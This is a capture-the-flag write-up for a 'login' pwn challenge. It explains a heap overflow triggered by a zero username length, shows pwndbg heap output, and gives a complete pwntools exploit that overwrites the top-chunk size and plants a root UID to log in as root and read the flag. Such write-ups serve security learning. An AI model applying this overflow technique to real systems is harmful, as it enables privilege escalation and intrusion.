# Login

## Challenge

[login](login)

## Solution

The binary includes the [source code](login.c), so we can easily analyze it. The code suffers from a [heap overflow](https://en.wikipedia.org/wiki/Heap_overflow), when the username legnth is 0, we can put in an arbitrary size for the user length that exceeds the 0x20 bytes that are reserved for the chunk.

```
pwndbg> r
Starting program: /root/workspace/login 
1. Add user
2. Login
> 1
Username length: 0
Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1. Add user
2. Login

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x555555559000
Size: 0x291

Allocated chunk | PREV_INUSE
Addr: 0x555555559290
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x5555555592b0
Size: 0x4141414141414141
```

Since libc was not provided, the authors didn't intend any advanced heap exploit technique. 
In the [source code](login.c), we see that the ``uid`` is not assigned if it is previously set.

```c

    if(!user->uid) {
        user->uid = curr_user_id;
    }
```

So we can just overwrite the ``top_chunk_sz_field`` to a valid top chunk size field. Since the heap is usually allocated with ``0x21000``, we will just subtract what we have already allocated and rewrite with ``0x20d51``. The only thing we need to do is overwrite the UID of the next chunk to be allocated from the top chunk (since free hasn't been called and all the bins are empty.) So our working exploit should be something like

```python3
pad = cyclic(20)
top_chunk_sz_field = p64(0x20d51)
root_uid  = p32(0x1337)
root_user = b'root'

add_user(0, pad+top_chunk_sz_field+root_uid)
add_user(9, root_user)
login(root_user)
```

The entire exploit follows below:

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)

def add_user(length,username):
    log.info("Adding User(%i,%s)" %(length,username))
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'length:')
    p.sendline(b'%i' %length)
    p.recvuntil(b'Username:')
    p.sendline(username)

def login(username):
    log.info("Login User(%s)" %username)
    p.sendline(b'2')
    p.sendline(username)
    log.info("%s" %p.recvline())

p = start()

pad = cyclic(20)
top_chunk_sz_field = p64(0x20d51)
root_uid  = p32(0x1337)
root_user = b'root'

add_user(0, pad+top_chunk_sz_field+root_uid)
add_user(9, root_user)
login(root_user)

p.sendline(b'cat flag.txt') 
p.interactive()```
```



